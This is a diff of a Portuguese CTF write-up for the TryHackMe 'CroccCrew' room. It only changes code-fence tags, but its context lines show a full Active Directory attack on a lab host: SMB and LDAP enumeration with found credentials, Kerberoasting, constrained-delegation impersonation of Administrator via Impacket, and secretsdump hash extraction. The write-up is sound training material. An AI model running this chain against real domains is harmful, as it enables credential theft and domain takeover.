@@ -32,7 +32,7 @@ Vamos começar.
 
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.255.206 --min-rate=512
 PORT      STATE SERVICE       VERSION
@@ -105,7 +105,7 @@ Aparentemente não passa de um `rabbit role` que nos fará perder tempo, vamos a
 
 Na enumeração com nmap, também encontramos a porta `3389`, que tipicamente é usada para o serviço `RDP`, não temos um usuário e nem uma senha, mas podemos tentar uma conexão com o `rdesktop`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ rdesktop 10.10.255.206   
 ```
@@ -116,7 +116,7 @@ Entramos na tela de login, não temos credenciais, mas podemos ver um `stick` co
 
 Podemos rodar o rdesktop em tela cheia para visualizarmos o stick inteiro.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ rdesktop -f 10.10.255.206   
 ```
@@ -130,7 +130,7 @@ Aparentemente é tudo que encontramos no RDP.
 
 O server também tem SMB, vamos tentar um acesso com `null session`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ smbclient -L \\10.10.255.206
 Enter WORKGROUP\hastur's password: 
@@ -143,7 +143,7 @@ SMB1 disabled -- no workgroup available
 
 Não temos acesso com null session, mas podemos tentar com as credenciais que encontramos no stick do RDP.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ smbclient -L \\10.10.255.206 -U Visitor 
 Enter WORKGROUP\Visitor's password: 
@@ -162,7 +162,7 @@ Desta vez conseguimos validar a credencial!!!
 
 Vamos nos conectar no diretório `Home`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ smbclient \\\\10.10.255.206\\Home -U Visitor 
 Enter WORKGROUP\Visitor's password: 
@@ -185,7 +185,7 @@ Porém nenhum outro diretório trouxe alguma informação relevante, vamos conti
 
 Como a credencial funcionou perfeitamente com o SMB, podemos tentar usá-la para obter indormações do AD, com o `ldapsearch`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ ldapsearch -h 10.10.255.206 -x -s base namingcontexts
 # extended LDIF
@@ -233,7 +233,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 
 Agora rodando com autenticação, podemos obter informações mais completas sobre usuários, inclusive o possível `usuário implantado` que corresponde à segunda flag.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ ldapsearch -h 10.10.255.206 -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -W
 ----------CORTADO-----------
@@ -289,7 +289,7 @@ O usuário implantado é `admCroccCrew`.
 Vimos na varredura com nmap que a porta 88 está aberta, tipicamente `kerberos`.
 Podemos utilizar o `GetUserSPNs.py` para tentarmos obter um `TGT Ticket` com a credencial que temos.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:'GuestLogin!' -dc-ip 10.10.255.206 -outputfile hash
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -306,7 +306,7 @@ HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021
 ```
 Ótimo, conseguimos nos conectar, e aparentemente o nome do usuário é `password-reset`, mas não obtivemos resposta, isto acontece pelo fato da minha data e hora local, está fora do range do kerberos, conforme a mensagem de erro. Precisamos ajustar nossa hora de acordo com a hora do servidor.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ sudo net time set -S 10.10.255.206                                                                           255 ⨯
 [sudo] password for hastur: 
@@ -314,7 +314,7 @@ HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021
 
 Agora tentando novamente, conseguimos a hash.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:'GuestLogin!' -dc-ip 10.10.255.206 -outputfile hash
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -355,7 +355,7 @@ Session completed
 ```
 Com a credencial `password-reset:resetpassword`, podemos verificar se ele possui a opção `impersonate` habilitada e tentar um `TGT Silver Ticket` no kerberos.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.255.206 -spn HTTP/dc.cooctus.corp -impersonate Administrator cooctus.corp/password-reset:resetpassword
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -367,7 +367,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
 [-] Probably SPN is not allowed to delegate by user password-reset or initial TGT not forwardable
 
-```
+```bash
 Aparentemente este `SPN` não é habillitado para delegar um TGT silver ticket para este usuário.
 Podemos verificar se existe algum SPN habilitado a delegar, com o `impacket-findDelegation.py`.
 
@@ -389,7 +389,7 @@ password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCT
 
 Vamos tentar o Silver Ticket novamente.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.255.206 -spn oakley/DC.COOCTUS.CORP -impersonate Administrator cooctus.corp/password-reset:resetpassword
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -412,7 +412,7 @@ drwxr-xr-x 33 hastur hastur 4096 Sep 14 21:56 ..
 
 Ótimo, conseguimos recuperar as credenciais do Administrador que foram armazenadas no arquivo `Administrator.ccache`, este arquivo deve ser colocado em uma variável para que possamos utilizá-lo.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ export KRB5CCNAME=Administrator.ccache
 ```
@@ -421,7 +421,7 @@ drwxr-xr-x 33 hastur hastur 4096 Sep 14 21:56 ..
 
 Com as credenciais do Administrador em mãos e salvas em uma variável, podemos utilizar o `secretsdump.py` para capturar as hashes.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -434,7 +434,7 @@ O secretsdump nos trouxe um erro, mas provavelmente porque não reconheceu o `DC
 
 <img src="/thm/thm-crocccrew-8.png">
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
